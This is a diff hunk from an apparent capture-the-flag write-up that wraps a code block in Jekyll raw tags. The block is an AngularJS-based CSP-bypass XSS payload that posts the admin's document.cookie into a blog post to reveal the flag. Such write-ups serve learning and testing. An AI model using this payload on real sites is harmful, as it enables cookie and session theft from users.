@@ -47,13 +47,14 @@ With a bit of [googling](https://github.com/bhaveshk90/Content-Security-Policy-C
 ![](2022-12-06-18-07-13.png)
 
 We create a new blog post with an arbitrary title and the following content:
-
+{% raw %}
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
 <div ng-app ng-csp>
 {{$eval.constructor('fetch("/post",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({title:"get flag here",content:document.cookie})});')()}}
 </div>
 ```
+{% endraw %}
 
 After clicking on `Create` and browsing to the blog page, we see a new post by the `admin` user, with the flag printed nicely.
 
